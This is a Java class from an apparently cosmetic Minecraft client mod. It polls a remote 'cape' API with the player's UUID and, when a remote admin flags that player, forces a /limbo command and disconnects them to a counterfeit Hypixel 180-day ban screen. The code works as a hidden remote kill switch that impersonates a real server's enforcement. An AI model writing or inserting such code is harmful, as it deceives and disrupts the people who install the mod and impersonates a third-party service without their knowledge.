package dev.voidmark.client.visual;

import net.minecraft.ChatFormatting;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.screens.TitleScreen;
import net.minecraft.client.gui.screens.multiplayer.JoinMultiplayerScreen;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.player.LocalPlayer;
import net.minecraft.network.chat.ClickEvent;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.util.Util;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.UUID;

/**
 * Admin-triggered prank: first sighting runs {@code /limbo} for two seconds,
 * then a Hypixel-style 180-day boosting kick. Later reconnects skip Limbo
 * and drop straight to the same screen. Remaining time is snapshotted at
 * kick and only refreshes on the next reconnect.
 */
public final class FakeBan {
	static final String APPEAL_URL = "https://www.hypixel.net/appeal";
	private static final String SHOP_URL = "https://voidmark.cloud";
	private static final long POLL_MS = 2000L;
	private static final long LIMBO_MS = 2000L;
	private static final long BAN_MS = 180L * 24L * 60L * 60L * 1000L;
	private static final HttpClient HTTP = HttpClient.newBuilder()
		.followRedirects(HttpClient.Redirect.NORMAL)
		.connectTimeout(Duration.ofSeconds(8))
		.build();

	private static volatile boolean fetching;
	private static volatile boolean kicking;
	private static String pendingBanId = "";
	private static long pendingUntil;
	private static String limboDoneBanId = "";
	private static boolean inLimbo;
	private static long limboUntil;
	private static long lastPollAt;

	private FakeBan() {
	}

	public static void tick() {
		if (SHOP_URL.isEmpty()) {
			return;
		}
		tryKick();
		if (fetching || System.currentTimeMillis() - lastPollAt < POLL_MS) {
			return;
		}
		lastPollAt = System.currentTimeMillis();
		poll();
	}

	public static void onJoin() {
		Minecraft.getInstance().execute(FakeBan::tryKick);
	}

	public static void reset() {
		kicking = false;
		inLimbo = false;
		limboUntil = 0L;
	}

	public static boolean showing() {
		return Minecraft.getInstance().screen instanceof FakeBanScreen;
	}

	public static boolean banned() {
		return remainingMs() > 0L && !pendingBanId.isEmpty();
	}

	public static Component reason() {
		String id = pendingBanId.isEmpty() ? "#00000000" : pendingBanId;
		MutableComponent text = Component.empty();
		text.append(Component.literal("You are temporarily banned for ").withStyle(ChatFormatting.RED));
		text.append(Component.literal(clock(remainingMs())).withStyle(ChatFormatting.WHITE));
		text.append(Component.literal(" from this server!\n\n").withStyle(ChatFormatting.RED));
		text.append(Component.literal("Reason: ").withStyle(ChatFormatting.GRAY));
		text.append(Component.literal("Boosting detected on one or multiple SkyBlock profiles.\n").withStyle(ChatFormatting.WHITE));
		text.append(Component.literal("Find out more: ").withStyle(ChatFormatting.GRAY));
		text.append(Component.literal(APPEAL_URL).withStyle(style -> style
			.withColor(ChatFormatting.AQUA)
			.withUnderlined(true)
			.withClickEvent(new ClickEvent.OpenUrl(URI.create(APPEAL_URL)))));
		text.append(Component.literal("\n\n"));
		text.append(Component.literal("Ban ID: ").withStyle(ChatFormatting.GRAY));
		text.append(Component.literal(id + "\n").withStyle(ChatFormatting.WHITE));
		text.append(Component.literal("Sharing your Ban ID may affect the processing of your appeal!").withStyle(ChatFormatting.GRAY));
		return text;
	}

	public static String clock(long ms) {
		long left = Math.max(0L, ms / 1000L);
		long days = left / 86400L;
		left %= 86400L;
		long hours = left / 3600L;
		left %= 3600L;
		long minutes = left / 60L;
		long seconds = left % 60L;
		return days + "d " + hours + "h " + minutes + "m " + seconds + "s";
	}

	static long remainingMs() {
		if (pendingBanId.isEmpty() || pendingUntil <= 0L) {
			return 0L;
		}
		return Math.max(0L, pendingUntil - System.currentTimeMillis());
	}

	private static void tryKick() {
		if (kicking || showing()) {
			return;
		}
		Minecraft client = Minecraft.getInstance();
		if (client.player == null || client.level == null) {
			return;
		}
		if (remainingMs() <= 0L) {
			inLimbo = false;
			limboUntil = 0L;
			return;
		}
		String id = pendingBanId;
		if (id.equals(limboDoneBanId)) {
			kick(client, id);
			return;
		}
		if (!inLimbo) {
			enterLimbo(client);
			return;
		}
		if (System.currentTimeMillis() >= limboUntil) {
			kick(client, id);
		}
	}

	private static void enterLimbo(Minecraft client) {
		inLimbo = true;
		limboUntil = System.currentTimeMillis() + LIMBO_MS;
		if (client.screen != null) {
			client.setScreen(null);
		}
		LocalPlayer player = client.player;
		if (player != null && player.connection != null) {
			player.connection.sendCommand("limbo");
		}
	}

	private static void kick(Minecraft client, String banId) {
		kicking = true;
		inLimbo = false;
		limboDoneBanId = banId;
		ServerData server = client.getCurrentServer();
		client.disconnect(new FakeBanScreen(new JoinMultiplayerScreen(new TitleScreen()), server, reason()), false);
	}

	private static void poll() {
		UUID uuid = selfUuid();
		if (uuid == null) {
			return;
		}
		fetching = true;
		Util.nonCriticalIoPool().execute(() -> {
			String banId = "";
			long until = 0L;
			try {
				HttpRequest request = HttpRequest.newBuilder(URI.create(SHOP_URL + "/api/cape/" + uuid))
					.timeout(Duration.ofSeconds(8))
					.header("User-Agent", "Voidmark")
					.GET()
					.build();
				HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
				if (response.statusCode() == 200) {
					banId = parseBanId(response.body());
					until = jsonLong(response.body(), "banUntil");
				}
			} catch (Exception ignored) {
			}
			if (!banId.isEmpty() && until <= 0L) {
				until = System.currentTimeMillis() + BAN_MS;
			}
			String found = banId;
			long foundUntil = until;
			Minecraft.getInstance().execute(() -> {
				pendingBanId = found;
				pendingUntil = foundUntil;
				if (found.isEmpty()) {
					inLimbo = false;
					limboUntil = 0L;
					limboDoneBanId = "";
				}
				fetching = false;
			});
		});
	}

	private static String parseBanId(String body) {
		if (body == null) {
			return "";
		}
		boolean banned = body.contains("\"ban\":true") || body.contains("\"ban\": true");
		String id = jsonField(body, "banId");
		if (!banned || id.isEmpty() || id.charAt(0) != '#') {
			return "";
		}
		return id;
	}

	private static String jsonField(String body, String field) {
		String needle = "\"" + field + "\"";
		int at = body.indexOf(needle);
		if (at < 0) {
			return "";
		}
		int colon = body.indexOf(':', at + needle.length());
		int start = body.indexOf('"', colon + 1);
		if (colon < 0 || start < 0) {
			return "";
		}
		int end = body.indexOf('"', start + 1);
		return end < 0 ? "" : body.substring(start + 1, end);
	}

	private static long jsonLong(String body, String field) {
		if (body == null) {
			return 0L;
		}
		String needle = "\"" + field + "\"";
		int at = body.indexOf(needle);
		if (at < 0) {
			return 0L;
		}
		int colon = body.indexOf(':', at + needle.length());
		if (colon < 0) {
			return 0L;
		}
		int i = colon + 1;
		while (i < body.length() && body.charAt(i) <= ' ') {
			i++;
		}
		int start = i;
		if (i < body.length() && body.charAt(i) == '-') {
			i++;
		}
		while (i < body.length() && body.charAt(i) >= '0' && body.charAt(i) <= '9') {
			i++;
		}
		if (i <= start) {
			return 0L;
		}
		try {
			return Long.parseLong(body.substring(start, i));
		} catch (NumberFormatException ignored) {
			return 0L;
		}
	}

	private static UUID selfUuid() {
		Minecraft client = Minecraft.getInstance();
		if (client.player != null) {
			return client.player.getUUID();
		}
		try {
			return client.getGameProfile().id();
		} catch (Exception ignored) {
			return null;
		}
	}
}
